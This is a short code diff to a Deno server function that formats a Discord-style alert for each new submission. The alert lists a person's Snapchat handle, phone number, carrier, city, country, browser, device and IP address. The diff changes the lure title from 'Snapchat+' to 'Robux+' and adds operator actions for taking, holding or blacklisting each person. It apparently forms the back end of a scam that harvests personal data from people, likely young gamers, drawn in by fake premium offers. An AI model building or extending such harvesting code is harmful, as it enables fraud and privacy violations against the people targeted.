@@ -34,21 +34,24 @@ Deno.serve(async (req) => {
       timeZone: "Europe/Paris"
     });
 
+    const fields = [
+      { name: "👤 Utilisateur", value: `@${snapchat}`, inline: true },
+      { name: "📡 Opérateur", value: operateur, inline: true },
+      { name: "📞 Numéro", value: formatPhone(telephone), inline: true },
+      { name: "🌍 Pays", value: finalCountry, inline: true },
+      { name: "🏙️ Ville", value: finalCity, inline: true },
+      { name: "🌐 Navigateur", value: browser || "Inconnu", inline: true },
+      { name: "💾 Appareil", value: device || "Inconnu", inline: true },
+      { name: "🕵️ Adresse IP", value: `\`${ip || "Inconnue"}\``, inline: false },
+      { name: "🕐 Date de soumission", value: dateStr, inline: false },
+      { name: "⚡ Actions", value: `✅ Réagis avec ✅ pour prendre en charge\n❌ Mauvais numéro\n⭐ Faire patienter\n🚫 Blacklist instant`, inline: false }
+    ];
+
     const embed = {
-      title: "📱 Nouvelle soumission Snapchat+",
-      color: operatorColors[operateur] || 16776960,
-      fields: [
-        { name: "👤 Utilisateur", value: `@${snapchat}`, inline: true },
-        { name: "📡 Opérateur", value: operateur, inline: true },
-        { name: "📞 Numéro", value: formatPhone(telephone), inline: true },
-        { name: "🌍 Pays", value: finalCountry, inline: true },
-        { name: "🏙️ Ville", value: finalCity, inline: true },
-        { name: "🌐 Navigateur", value: browser || "Inconnu", inline: true },
-        { name: "💾 Appareil", value: device || "Inconnu", inline: true },
-        { name: "🕵️ Adresse IP", value: `\`${ip || "Inconnue"}\``, inline: false },
-        { name: "🕐 Date de soumission", value: dateStr, inline: false },
-      ],
-      footer: { text: `ID: ${submissionId || "N/A"}` },
+      title: "📦 Nouvelle soumission Robux+",
+      color: 3447003,
+      fields: fields,
+      footer: { text: `ID: ${submissionId || "N/A"} • Today at ${now.toLocaleTimeString("fr-FR", { hour: "2-digit", minute: "2-digit", timeZone: "Europe/Paris" })}` },
       timestamp: now.toISOString(),
     };
 
